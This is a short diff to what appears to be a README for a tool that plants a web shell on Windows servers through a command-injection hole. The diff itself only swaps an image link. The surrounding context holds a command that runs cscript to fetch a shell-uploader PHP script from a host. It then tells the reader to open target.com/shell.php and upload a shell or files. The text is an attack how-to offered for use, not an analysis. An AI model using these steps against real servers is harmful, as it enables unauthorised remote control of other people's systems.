@@ -7,4 +7,4 @@ Upload shell in windows server using command injection vulnerbility.
 * cscript /nologo weget.js http://localhost/wci_shell_uploader.php
 
 After those two commands your get shell uploader at http://target.com/shell.php go on this link & upload your shell or files. 
-[![Video](https://imgur.com/a/JWT2wQF)](https://youtu.be/H5F93uEK7ME)
+[![Video](https://i.imgur.com/ehWbZdf.png)](https://youtu.be/H5F93uEK7ME)
